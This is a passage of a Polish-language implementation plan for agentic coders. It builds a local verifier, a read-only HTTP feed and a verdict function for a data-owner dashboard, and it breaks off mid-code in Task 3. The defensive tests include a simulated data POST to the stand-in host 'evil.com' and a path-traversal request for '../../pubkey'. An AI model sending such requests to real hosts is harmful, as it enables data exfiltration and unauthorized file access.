# poi dashboard — plan implementacji

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Właściciel danych na własnej maszynie widzi na żywo w przeglądarce przebieg `poi run` operatora, a każdy werdykt wynika z lokalnej weryfikacji kryptograficznej.

**Architecture:** Operator uruchamia `poi serve` (HTTP tylko do odczytu, token, TLS przez reverse proxy). Właściciel uruchamia `poi dashboard`: `Mirror` pobiera checkpointy long-pollingiem, zapisuje je do lokalnego lustra i weryfikuje przyrostowo (`ChainVerifier`), skanuje odciski swoim kluczem, a `assess` wylicza werdykt. Lokalny serwer (127.0.0.1, klucz sesji, CSP) podaje API i SSE dla jednej strony HTML/JS bez kroku budowania.

**Tech Stack:** Python 3.12 (biblioteka standardowa: `http.server`, `urllib`, `threading`), istniejący pakiet `poi`, czysty JS/CSS/HTML, pytest.

**Spec:** `docs/superpowers/specs/2026-10-13-poi-dashboard-design.md` (szczególnie §11 — korekty po prototypie). Gałąź: `feat/poi-v1`.

**Uwaga o pochodzeniu kodu:** cały kod został uruchomiony w prototypie na docelowym hoście; plan odtworzono od zera na kopii repozytorium i po każdym zadaniu testy przechodziły. Przepisuj dosłownie.

## Global Constraints

- Bez nowych zależności: tylko biblioteka standardowa + to, co już jest w `pyproject.toml`.
- `poi.verify` importuje z `poi` wyłącznie `canonical`, `lthash`, `evidence`, `policy` (test niezależności nadal obowiązuje).
- `poi serve` i `poi dashboard` domyślnie nasłuchują tylko na `127.0.0.1` (8765 / 8780).
- `poi serve` zwraca wyłącznie surowe bajty z dysku; brak endpointu klucza publicznego, zapisu, listowania i logów.
- Dashboard: klucz sesji `?key=` → cookie `poi_session` (`HttpOnly; SameSite=Strict`); `POST` wymaga nagłówka `x-poi: 1`; nagłówek `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'`.
- UI po angielsku; dane z przebiegu wstawiane wyłącznie przez `textContent`/`createTextNode`; brak `innerHTML`, inline `<script>`, atrybutów `style` i zasobów zewnętrznych.
- Werdykt: `broken` (VerifyError lub trafienie odcisku w ruchu dozwolonym) > `attention` (niepotwierdzona zablokowana próba z trafieniem; brak checkpointu > 3 × `tick_seconds` od lokalnego odbioru, o ile operator nie deklaruje `exited`; źródło nieosiągalne > 3 × `tick_seconds`; nieograniczona pojemność kanału) > `verified`.
- Deklaracje operatora (status/CPU/RAM) nigdy nie wpływają na werdykt poza wyłączeniem alarmu „brak checkpointu” po `exited`.
- Commity kończą się linią `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.

---

### Task 1: Przyrostowy weryfikator `ChainVerifier`

Weryfikacja checkpoint po checkpoincie ze stanem przenoszonym między wywołaniami (spec §5.1); `verify_chain`/`verify_policy` zostają jako nakładki z identycznym zachowaniem.

**Files:**
- Modify (zastąp cały plik): `src/poi/verify.py`
- Test: `tests/test_verify_incremental.py`

**Interfaces:**
- Consumes: `poi.canonical`, `poi.lthash`, `poi.evidence`, `poi.policy` (bez nowych importów z `poi`)
- Produces: `parse_delta(cp, raw) -> list[(op, acc, element)]`; `ChainVerifier(pubkey_hex, policy=None)` z `feed(cp, delta_raw, get_evidence=None) -> list[Event]` (atomowe: przy `VerifyError` stan się nie zmienia), `next_checkpoint: int`, `res: VerifyResult`; `verify_run(run_dir, pubkey_hex, policy) -> ChainVerifier`. `verify_chain`, `verify_policy`, `VerifyError`, `Event`, `VerifyResult`, stałe `E_*` — bez zmian.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_verify_incremental.py`:

```python
import json

import pytest

from poi import evidence
from poi.ledger import pubkey_hex
from poi.policy import parse
from poi.verify import (E_CHAIN, E_DELTA, E_EVIDENCE, ChainVerifier, VerifyError, verify_chain,
                        verify_policy, verify_run)

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, POLICY, FakeFS, make_engine, make_run


def _cps(run):
    return [json.loads(p.read_bytes()) for p in sorted((run / "ledger").glob("*.json"))]


def _delta(run, seq):
    return (run / "delta" / f"{seq:06d}.jsonl").read_bytes()


def test_feed_matches_batch_verify(tmp_path, key):
    make_run(tmp_path, key)
    v = ChainVerifier(pubkey_hex(key))
    new = [v.feed(cp, _delta(tmp_path, cp["seq"])) for cp in _cps(tmp_path)]
    batch = verify_chain(tmp_path, pubkey_hex(key))
    assert [len(n) for n in new] == [0, 4, 2]
    assert v.res.accs == batch.accs
    assert [e.seq for e in v.res.egress] == [e.seq for e in batch.egress]
    assert v.next_checkpoint == 3


def test_failed_feed_does_not_change_state(tmp_path, key):
    make_run(tmp_path, key)
    cps = _cps(tmp_path)
    v = ChainVerifier(pubkey_hex(key))
    v.feed(cps[0], _delta(tmp_path, 0))
    with pytest.raises(VerifyError) as ei:
        v.feed(cps[1], _delta(tmp_path, 1) + b"\n")
    assert ei.value.code == E_DELTA
    v.feed(cps[1], _delta(tmp_path, 1))      # the honest file still verifies afterwards
    assert v.next_checkpoint == 2


def test_out_of_order_rejected(tmp_path, key):
    make_run(tmp_path, key)
    cps = _cps(tmp_path)
    v = ChainVerifier(pubkey_hex(key))
    with pytest.raises(VerifyError) as ei:
        v.feed(cps[1], _delta(tmp_path, 1))
    assert ei.value.code == E_CHAIN


def _engine_run(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [], b"{}")
    gate.on_request("evil.com", "POST", "/", [], b"x")
    eng.tick()
    return tmp_path / "run"


def test_verify_run_equals_chain_plus_policy(tmp_path, key):
    run = _engine_run(tmp_path, key)
    v = verify_run(run, pubkey_hex(key), parse(POLICY))
    res = verify_chain(run, pubkey_hex(key))
    verify_policy(res, run, parse(POLICY))
    assert v.res.accs == res.accs and len(v.res.egress) == len(res.egress) == 2


def test_incremental_policy_check_needs_evidence(tmp_path, key):
    run = _engine_run(tmp_path, key)
    v = ChainVerifier(pubkey_hex(key), parse(POLICY))
    cps = _cps(run)
    v.feed(cps[0], _delta(run, 0), lambda d: evidence.get(run / "evidence", d))
    with pytest.raises(VerifyError) as ei:
        v.feed(cps[1], _delta(run, 1), lambda d: None)
    assert ei.value.code == E_EVIDENCE
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_verify_incremental.py -v`
Expected: ERROR collecting — `ImportError: cannot import name 'ChainVerifier' from 'poi.verify'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/verify.py`:

```python
"""Independent verifier. Must import only: lthash, canonical, evidence, policy (+ cryptography).

Replays the checkpoint chain from genesis and checks every claim a checkpoint makes.
"""
from __future__ import annotations

import base64
import json
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

from poi import canonical as c
from poi import evidence
from poi.lthash import LtHash
from poi.policy import Policy, config_violations

E_SIGNATURE = 10
E_CHAIN = 11
E_DELTA = 12
E_SEQ = 13
E_SCHEMA = 14
E_CONFIG = 15
E_EVIDENCE = 16
E_LIVE = 17

ACCS = ("state", "egress", "ingress")


class VerifyError(Exception):
    def __init__(self, code: int, seq: int | None, msg: str) -> None:
        super().__init__(f"[{code}] checkpoint {seq}: {msg}")
        self.code = code
        self.seq = seq
        self.msg = msg


@dataclass
class Event:
    """A decoded egress/dns/ingress element plus the checkpoint it was recorded in."""
    checkpoint: int
    fields: list[str]

    @property
    def domain(self) -> str:
        return self.fields[0]

    @property
    def seq(self) -> int:
        return int(self.fields[1])


@dataclass
class VerifyResult:
    checkpoints: list[dict] = field(default_factory=list)
    accs: dict[str, LtHash] = field(default_factory=dict)
    state_elements: Counter = field(default_factory=Counter)
    egress: list[Event] = field(default_factory=list)
    ingress: list[Event] = field(default_factory=list)
    config_digests: list[tuple[int, str]] = field(default_factory=list)

    @property
    def last(self) -> dict:
        return self.checkpoints[-1]


def _load_checkpoints(run_dir: Path) -> list[dict]:
    files = sorted((run_dir / "ledger").glob("*.json"))
    if not files:
        raise VerifyError(E_CHAIN, None, "no checkpoints")
    cps = []
    for i, f in enumerate(files):
        if f.name != f"{i:06d}.json":
            raise VerifyError(E_CHAIN, i, f"missing or misnamed checkpoint file (found {f.name})")
        cp = json.loads(f.read_bytes())
        if cp.get("seq") != i:
            raise VerifyError(E_CHAIN, i, f"seq field {cp.get('seq')} != position {i}")
        cps.append(cp)
    return cps


def _check_sig(cp: dict, pub: Ed25519PublicKey) -> None:
    try:
        pub.verify(bytes.fromhex(cp["sig"]), c.checkpoint_signing_bytes(cp))
    except (InvalidSignature, ValueError, KeyError) as e:
        raise VerifyError(E_SIGNATURE, cp.get("seq"), f"bad signature ({type(e).__name__})")


def parse_delta(cp: dict, raw: bytes) -> list[tuple[str, str, bytes]]:
    """Check the delta file against its checkpoint and decode it into (op, acc, element)."""
    seq = cp["seq"]
    if c.b2b256(raw) != cp["delta"]:
        raise VerifyError(E_DELTA, seq, "delta file digest mismatch")
    ops = []
    for line in raw.splitlines():
        d = json.loads(line)
        if d["op"] not in ("add", "sub") or d["acc"] not in ACCS:
            raise VerifyError(E_DELTA, seq, f"malformed op {d}")
        ops.append((d["op"], d["acc"], base64.b64decode(d["element"], validate=True)))
    return ops


def _read_delta(run_dir: Path, cp: dict) -> bytes:
    try:
        return (run_dir / "delta" / f"{cp['seq']:06d}.jsonl").read_bytes()
    except FileNotFoundError:
        raise VerifyError(E_DELTA, cp["seq"], "delta file missing")


GetEvidence = Callable[[str], "bytes | None"]


def _evidence(get: GetEvidence, digest: str, cp_seq: int, what: str) -> bytes:
    data = get(digest)
    if data is None:
        raise VerifyError(E_EVIDENCE, cp_seq, f"{what} evidence {digest[:12]}… missing or corrupt")
    return data


def _check_binding(cp: dict, policy: Policy) -> None:
    if cp["policy"] != policy.digest:
        raise VerifyError(E_CONFIG, cp["seq"], "checkpoint is bound to a different policy")


def _check_config(seq: int, digest: str, get: GetEvidence, policy: Policy) -> None:
    doc = json.loads(_evidence(get, digest, seq, "config"))
    if v := config_violations(doc, policy):
        raise VerifyError(E_CONFIG, seq, "; ".join(v))


def _check_egress(ev: Event, get: GetEvidence, policy: Policy) -> None:
    f = ev.fields
    if ev.domain == "dns":
        _, _, _, name, qtype, verdict = f
        if verdict == "allow" and (name not in policy.hosts or qtype != "A"):
            raise VerifyError(E_SCHEMA, ev.checkpoint, f"dns seq {ev.seq}: {name} answered but not allowed")
        return
    _, _, _, method, host, path, hdig, bdig, verdict, _ = f
    headers = _evidence(get, hdig, ev.checkpoint, f"egress {ev.seq} headers")
    body = _evidence(get, bdig, ev.checkpoint, f"egress {ev.seq} body")
    if verdict != "allow":
        return
    d = policy.decide(host, method, path, body)
    if d.verdict != "allow" or d.body != body:
        raise VerifyError(E_SCHEMA, ev.checkpoint, f"egress seq {ev.seq} does not satisfy policy ({d.reason})")
    fwd = [["content-type", "application/json"]] if body else []
    fwd += [[k, v] for k, v in sorted(policy.forward_headers.items())]
    if json.loads(headers) != sorted(fwd):
        raise VerifyError(E_SCHEMA, ev.checkpoint, f"egress seq {ev.seq} forwarded unexpected headers")


def _check_ingress(ev: Event, get: GetEvidence) -> None:
    _evidence(get, ev.fields[3], ev.checkpoint, f"ingress {ev.seq} headers")
    _evidence(get, ev.fields[4], ev.checkpoint, f"ingress {ev.seq} body")


class ChainVerifier:
    """Incremental verifier: feed checkpoints in order; state carries over between calls.

    Without a policy it checks 10–13 (chain); with a policy also 14–16 for each checkpoint.
    """

    def __init__(self, pubkey_hex: str, policy: Policy | None = None) -> None:
        self.pub = Ed25519PublicKey.from_public_bytes(bytes.fromhex(pubkey_hex))
        self.policy = policy
        self.res = VerifyResult(accs={a: LtHash() for a in ACCS})
        self._allowed: set[int] = set()
        self._seen_ingress: set[int] = set()
        self._next_seq = 1
        self._prev: dict | None = None

    @property
    def next_checkpoint(self) -> int:
        return len(self.res.checkpoints)

    def feed(self, cp: dict, delta_raw: bytes, get_evidence: GetEvidence | None = None) -> list[Event]:
        """Verify one checkpoint. Returns the egress/dns/ingress events it introduced."""
        res = self.res
        seq = cp.get("seq")
        if seq != self.next_checkpoint:
            raise VerifyError(E_CHAIN, seq, f"expected checkpoint {self.next_checkpoint}")
        _check_sig(cp, self.pub)
        prev = self._prev
        if prev is None:
            if cp["prev"] is not None:
                raise VerifyError(E_CHAIN, seq, "genesis has non-null prev")
        else:
            if cp["prev"] != c.checkpoint_digest(prev):
                raise VerifyError(E_CHAIN, seq, "prev does not match previous checkpoint")
            if cp["t"] < prev["t"]:
                raise VerifyError(E_CHAIN, seq, "time went backwards")

        accs = {a: h.copy() for a, h in res.accs.items()}   # commit only if the whole checkpoint verifies
        state = res.state_elements.copy()
        new_events: list[Event] = []
        new_configs: list[tuple[int, str]] = []
        next_seq = self._next_seq
        allowed, seen = set(self._allowed), set(self._seen_ingress)
        for op, acc, element in parse_delta(cp, delta_raw):
            fields = c.decode(element)
            if acc == "state":
                if fields[0] not in ("file", "config"):
                    raise VerifyError(E_DELTA, seq, f"domain {fields[0]} in state accumulator")
                if op == "add":
                    accs["state"].add(element)
                    state[element] += 1
                    if fields[0] == "config":
                        new_configs.append((seq, fields[1]))
                else:
                    if state[element] == 0:
                        raise VerifyError(E_DELTA, seq, "sub of element not in state")
                    accs["state"].sub(element)
                    state[element] -= 1
                continue
            if op != "add":
                raise VerifyError(E_SEQ, seq, f"{acc} accumulator is append-only")
            ev = Event(seq, fields)
            if acc == "egress":
                if ev.domain not in ("egress", "dns"):
                    raise VerifyError(E_DELTA, seq, f"domain {ev.domain} in egress accumulator")
                if ev.seq != next_seq:
                    raise VerifyError(E_SEQ, seq, f"egress seq {ev.seq}, expected {next_seq}")
                next_seq += 1
                if ev.domain == "egress" and fields[8] == "allow":
                    allowed.add(ev.seq)
            else:
                if ev.domain != "ingress":
                    raise VerifyError(E_DELTA, seq, f"domain {ev.domain} in ingress accumulator")
                if ev.seq not in allowed or ev.seq in seen:
                    raise VerifyError(E_SEQ, seq, f"ingress seq {ev.seq} has no unique allowed request")
                seen.add(ev.seq)
            accs[acc].add(element)
            new_events.append(ev)

        for acc in ACCS:
            claimed = LtHash.from_b64(cp[acc]["vec"])
            if claimed != accs[acc] or cp[acc]["digest"] != claimed.digest():
                raise VerifyError(E_DELTA, seq, f"{acc} accumulator does not match prev + delta")
        n_egress = len(res.egress) + sum(e.domain != "ingress" for e in new_events)
        n_ingress = len(res.ingress) + sum(e.domain == "ingress" for e in new_events)
        if cp["egress"]["count"] != n_egress or cp["ingress"]["count"] != n_ingress:
            raise VerifyError(E_SEQ, seq, "count does not match number of events")

        if self.policy is not None:
            get = get_evidence or (lambda d: None)
            _check_binding(cp, self.policy)
            for cseq, digest in new_configs:
                _check_config(cseq, digest, get, self.policy)
            for ev in new_events:
                if ev.domain == "ingress":
                    _check_ingress(ev, get)
                else:
                    _check_egress(ev, get, self.policy)

        res.accs, res.state_elements = accs, state
        res.config_digests += new_configs
        for ev in new_events:
            (res.ingress if ev.domain == "ingress" else res.egress).append(ev)
        self._next_seq, self._allowed, self._seen_ingress = next_seq, allowed, seen
        if "rotate" in cp:
            self.pub = Ed25519PublicKey.from_public_bytes(bytes.fromhex(cp["rotate"]))
        res.checkpoints.append(cp)
        self._prev = cp
        return new_events


def verify_chain(run_dir: Path, pubkey_hex: str) -> VerifyResult:
    """Checks signatures (10), chain links and time (11), delta sums (12), seq/count (13)."""
    run_dir = Path(run_dir)
    v = ChainVerifier(pubkey_hex)
    for cp in _load_checkpoints(run_dir):
        v.feed(cp, _read_delta(run_dir, cp))
    return v.res


def verify_policy(res: VerifyResult, run_dir: Path, policy: Policy) -> None:
    """Checks policy binding and configuration (15), evidence (16) and schema conformance (14)."""
    edir = Path(run_dir) / "evidence"

    def get(d: str) -> bytes | None:
        return evidence.get(edir, d)

    for cp in res.checkpoints:
        _check_binding(cp, policy)
    for seq, digest in res.config_digests:
        _check_config(seq, digest, get, policy)
    for ev in res.egress:
        _check_egress(ev, get, policy)
    for ev in res.ingress:
        _check_ingress(ev, get)


def verify_run(run_dir: Path, pubkey_hex: str, policy: Policy) -> ChainVerifier:
    """Incremental equivalent of verify_chain + verify_policy over a run directory."""
    run_dir = Path(run_dir)
    v = ChainVerifier(pubkey_hex, policy)
    for cp in _load_checkpoints(run_dir):
        v.feed(cp, _read_delta(run_dir, cp), lambda d: evidence.get(run_dir / "evidence", d))
    return v
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest -m 'not docker' -q`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/verify.py tests/test_verify_incremental.py
git commit -m "refactor: incremental ChainVerifier behind the existing verify API

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 2: `poi serve`: API operatora tylko do odczytu

Surowe bajty przebiegu przez HTTP z tokenem Bearer, long-polling checkpointów, deklaracje runtime z Dockera (spec §4).

**Files:**
- Create: `src/poi/runtime_info.py`
- Create: `src/poi/serve.py`
- Test: `tests/test_serve.py`

**Interfaces:**
- Consumes: `poi.gate.utcnow`, docker SDK (`containers.get`, `stats(stream=False)`)
- Produces: `runtime_info.declaration(client, workload_id, clock=utcnow) -> dict` (`status, started_at, cpu_percent, mem_bytes, observed_at`); `serve.new_token(path) -> str` (plik 0600); `serve.make_server(run_dir, token, host='127.0.0.1', port=8765, runtime=None, poll=0.2) -> ThreadingHTTPServer`; stałe `MAX_WAIT=30`, `MAX_BATCH=500`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_serve.py`:

```python
import json
import threading
import time
import urllib.error
import urllib.request

import pytest

from poi.runtime_info import _cpu_percent, declaration
from poi.serve import make_server, new_token

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, FakeFS, make_engine

TOKEN = "t0ken"


@pytest.fixture
def served(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    eng.genesis()
    gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    eng.tick()
    (tmp_path / "run" / "policy.yaml").write_bytes(b"version: 1\n")
    srv = make_server(tmp_path / "run", TOKEN, port=0, runtime=lambda: {"status": "running"}, poll=0.05)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_address[1]}"
    yield base, eng, tmp_path / "run"
    srv.shutdown()


def get(url, token=TOKEN):
    req = urllib.request.Request(url, headers={"authorization": f"Bearer {token}"} if token else {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def test_auth_required(served):
    base, *_ = served
    assert get(base + "/v1/policy", token=None)[0] == 401
    assert get(base + "/v1/policy", token="wrong")[0] == 401
    assert get(base + "/v1/policy") == (200, b"version: 1\n")


def test_checkpoints_raw_bytes(served):
    base, _, run = served
    code, body = get(base + "/v1/checkpoints?from=0")
    cps = json.loads(body)
    assert code == 200 and [cp["seq"] for cp in cps] == [0, 1]
    assert body == b"[" + b",".join(p.read_bytes() for p in sorted((run / "ledger").glob("*.json"))) + b"]"
    assert json.loads(get(base + "/v1/checkpoints?from=2")[1]) == []


def test_delta_evidence_and_validation(served):
    base, _, run = served
    assert get(base + "/v1/delta/1") == (200, (run / "delta" / "000001.jsonl").read_bytes())
    digest = next((run / "evidence").glob("*.bin")).stem
    assert get(base + f"/v1/evidence/{digest}")[0] == 200
    assert get(base + "/v1/evidence/../../pubkey")[0] in (400, 404)
    assert get(base + "/v1/evidence/" + "A" * 64)[0] == 400
    assert get(base + "/v1/delta/-1")[0] == 400
    assert get(base + "/v1/delta/99")[0] == 404
    assert get(base + "/v1/checkpoints?from=x")[0] == 400


def test_long_poll_returns_when_checkpoint_appears(served):
    base, eng, _ = served
    threading.Timer(0.3, eng.tick).start()
    t0 = time.monotonic()
    code, body = get(base + "/v1/checkpoints?from=2&wait=5")
    assert code == 200 and [cp["seq"] for cp in json.loads(body)] == [2]
    assert time.monotonic() - t0 < 4


def test_runtime_declaration(served):
    base, *_ = served
    assert json.loads(get(base + "/v1/runtime")[1]) == {"status": "running"}


def test_new_token_file_is_private(tmp_path):
    import os
    import stat
    tok = new_token(tmp_path / "t")
    assert len(tok) > 30 and stat.S_IMODE(os.stat(tmp_path / "t").st_mode) == 0o600


class _C:
    status = "running"
    attrs = {"State": {"StartedAt": "2026-10-13T18:00:00Z"}}

    def reload(self):
        pass

    def stats(self, stream):
        return {"cpu_stats": {"cpu_usage": {"total_usage": 300}, "system_cpu_usage": 2000, "online_cpus": 2},
                "precpu_stats": {"cpu_usage": {"total_usage": 100}, "system_cpu_usage": 1000},
                "memory_stats": {"usage": 4096}}


class _Client:
    class containers:
        @staticmethod
        def get(cid):
            return _C()


def test_declaration_from_docker():
    d = declaration(_Client(), "abc", clock=lambda: "T")
    assert d == {"status": "running", "started_at": "2026-10-13T18:00:00Z", "cpu_percent": 40.0,
                 "mem_bytes": 4096, "observed_at": "T"}
    assert _cpu_percent({}) == 0.0
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_serve.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.runtime_info'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/runtime_info.py`:

```python
"""Operator-declared runtime facts (status, CPU, memory). Unverifiable by design: shown, never trusted."""
from __future__ import annotations

from typing import Callable

from docker.errors import DockerException, NotFound

from poi.gate import utcnow


def _cpu_percent(stats: dict) -> float:
    cpu, pre = stats.get("cpu_stats", {}), stats.get("precpu_stats", {})
    cpu_delta = cpu.get("cpu_usage", {}).get("total_usage", 0) - pre.get("cpu_usage", {}).get("total_usage", 0)
    sys_delta = cpu.get("system_cpu_usage", 0) - pre.get("system_cpu_usage", 0)
    if cpu_delta <= 0 or sys_delta <= 0:
        return 0.0
    return round(cpu_delta / sys_delta * cpu.get("online_cpus", 1) * 100, 1)


def declaration(client, workload_id: str, clock: Callable[[], str] = utcnow) -> dict:
    out = {"status": "unknown", "started_at": None, "cpu_percent": None, "mem_bytes": None,
           "observed_at": clock()}
    try:
        c = client.containers.get(workload_id)
        c.reload()
        out["status"] = c.status
        out["started_at"] = c.attrs.get("State", {}).get("StartedAt")
        if c.status == "running":
            stats = c.stats(stream=False)
            out["cpu_percent"] = _cpu_percent(stats)
            out["mem_bytes"] = stats.get("memory_stats", {}).get("usage")
    except (NotFound, DockerException):
        pass
    return out
```

Utwórz `src/poi/serve.py`:

```python
"""`poi serve`: read-only HTTP feed of a run directory for the data owner's dashboard.

Serves raw bytes from disk only; all trust comes from signatures verified on the owner's side.
Bind to localhost and put TLS in front (Caddy/nginx).
"""
from __future__ import annotations

import hmac
import json
import os
import re
import secrets
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Callable
from urllib.parse import parse_qs, urlsplit

MAX_WAIT = 30.0
MAX_BATCH = 500
_SEQ = re.compile(r"^\d{1,9}$")
_DIGEST = re.compile(r"^[0-9a-f]{64}$")


def new_token(path: Path) -> str:
    token = secrets.token_urlsafe(32)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        f.write(token + "\n")
    return token


class _Cached:
    def __init__(self, fn: Callable[[], dict], ttl: float) -> None:
        self.fn, self.ttl = fn, ttl
        self._at, self._val = -1e9, None
        self._lock = threading.Lock()

    def get(self) -> dict:
        with self._lock:
            if time.monotonic() - self._at > self.ttl:
                self._val, self._at = self.fn(), time.monotonic()
            return self._val


def make_server(run_dir: Path, token: str, host: str = "127.0.0.1", port: int = 8765,
                runtime: Callable[[], dict] | None = None, poll: float = 0.2) -> ThreadingHTTPServer:
    run_dir = Path(run_dir)
    rt = _Cached(runtime or (lambda: {"status": "unknown"}), ttl=2.0)
    expected = f"Bearer {token}".encode()

    def checkpoint_batch(start: int) -> list[bytes]:
        out = []
        for seq in range(start, start + MAX_BATCH):
            p = run_dir / "ledger" / f"{seq:06d}.json"
            try:
                out.append(p.read_bytes())
            except FileNotFoundError:
                break
        return out

    class Handler(BaseHTTPRequestHandler):
        server_version = "poi-serve"

        def log_message(self, *args) -> None:
            pass

        def _send(self, code: int, body: bytes, ctype: str = "application/octet-stream") -> None:
            self.send_response(code)
            self.send_header("content-type", ctype)
            self.send_header("content-length", str(len(body)))
            self.send_header("cache-control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def _file(self, path: Path, ctype: str = "application/octet-stream") -> None:
            try:
                self._send(200, path.read_bytes(), ctype)
            except FileNotFoundError:
                self._send(404, b"not found\n", "text/plain")

        def do_GET(self) -> None:
            auth = (self.headers.get("authorization") or "").encode()
            if not hmac.compare_digest(auth, expected):
                return self._send(401, b"unauthorized\n", "text/plain")
            url = urlsplit(self.path)
            parts = url.path.strip("/").split("/")
            if parts[:1] != ["v1"] or len(parts) < 2:
                return self._send(404, b"not found\n", "text/plain")
            kind, arg = parts[1], (parts[2] if len(parts) == 3 else None)
            if kind == "checkpoints" and arg is None:
                q = parse_qs(url.query)
                try:
                    start = int(q.get("from", ["0"])[0])
                    wait = min(float(q.get("wait", ["0"])[0]), MAX_WAIT)
                except ValueError:
                    return self._send(400, b"bad query\n", "text/plain")
                if start < 0 or wait < 0:
                    return self._send(400, b"bad query\n", "text/plain")
                deadline = time.monotonic() + wait
                batch = checkpoint_batch(start)
                while not batch and time.monotonic() < deadline:
                    time.sleep(poll)
                    batch = checkpoint_batch(start)
                return self._send(200, b"[" + b",".join(batch) + b"]", "application/json")
            if kind == "delta" and arg is not None:
                if not _SEQ.match(arg):
                    return self._send(400, b"bad seq\n", "text/plain")
                return self._file(run_dir / "delta" / f"{int(arg):06d}.jsonl")
            if kind == "evidence" and arg is not None:
                if not _DIGEST.match(arg):
                    return self._send(400, b"bad digest\n", "text/plain")
                return self._file(run_dir / "evidence" / f"{arg}.bin")
            if kind == "policy" and arg is None:
                return self._file(run_dir / "policy.yaml", "application/yaml")
            if kind == "runtime" and arg is None:
                return self._send(200, json.dumps(rt.get()).encode(), "application/json")
            return self._send(404, b"not found\n", "text/plain")

    return ThreadingHTTPServer((host, port), Handler)
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_serve.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/runtime_info.py src/poi/serve.py tests/test_serve.py
git commit -m "feat: poi serve read-only feed with long-polling and runtime declarations

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 3: Werdykt: `assess`

Czysta funkcja werdyktu 🟢/🟠/🔴 ze zrzutu stanu i czasu (spec §6).

**Files:**
- Create: `src/poi/assess.py`
- Test: `tests/test_assess.py`

**Interfaces:**
- Consumes: —
- Produces: `VERIFIED='verified'`, `ATTENTION='attention'`, `BROKEN='broken'`, `STALE_TICKS=3`; `Snapshot(error, allowed_hits, blocked_hits, acked, last_received, started, source_down_since, tick_seconds, unbounded_channel, run_finished=False)`; `Verdict(level, reasons)`; `assess(snapshot, now: float) -> Verdict`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_assess.py`:

```python
import pytest

from poi.assess import ATTENTION, BROKEN, VERIFIED, Snapshot, assess


def snap(**kw):
    base = dict(error=None, allowed_hits=[], blocked_hits=[], acked=set(), last_received=100.0, started=0.0,
                source_down_since=None, tick_seconds=2.0, unbounded_channel=False)
    base.update(kw)
    return Snapshot(**base)


@pytest.mark.parametrize("kw,now,level,phrase", [
    ({}, 101.0, VERIFIED, None),
    ({"error": "[12] checkpoint 3: delta"}, 101.0, BROKEN, "Verification failed"),
    ({"allowed_hits": [7]}, 101.0, BROKEN, "ALLOWED"),
    ({"allowed_hits": [7], "error": "x"}, 101.0, BROKEN, "ALLOWED"),
    ({"blocked_hits": [4]}, 101.0, ATTENTION, "Blocked exfiltration"),
    ({"blocked_hits": [4], "acked": {4}}, 101.0, VERIFIED, None),
    ({}, 107.0, ATTENTION, "No new checkpoint"),
    ({"run_finished": True}, 500.0, VERIFIED, None),
    ({"last_received": None, "started": 0.0}, 7.0, ATTENTION, "No new checkpoint"),
    ({"source_down_since": 101.0}, 103.0, VERIFIED, None),
    ({"source_down_since": 101.0}, 108.0, ATTENTION, "unreachable"),
    ({"unbounded_channel": True}, 101.0, ATTENTION, "unbounded"),
])
def test_assess(kw, now, level, phrase):
    v = assess(snap(**kw), now)
    assert v.level == level
    if phrase:
        assert any(phrase in r for r in v.reasons)
    else:
        assert v.reasons == []
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_assess.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.assess'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/assess.py`:

```python
"""Dashboard verdict: a pure function of a status snapshot and the current time."""
from __future__ import annotations

from dataclasses import dataclass, field

VERIFIED, ATTENTION, BROKEN = "verified", "attention", "broken"
STALE_TICKS = 3


@dataclass
class Snapshot:
    error: str | None                     # VerifyError text, if verification failed
    allowed_hits: list[int]               # egress seqs with user data in ALLOWED traffic
    blocked_hits: list[int]               # egress seqs with user data in blocked attempts
    acked: set[int]
    last_received: float | None           # local monotonic time of the last new checkpoint
    started: float                        # local monotonic time the dashboard started
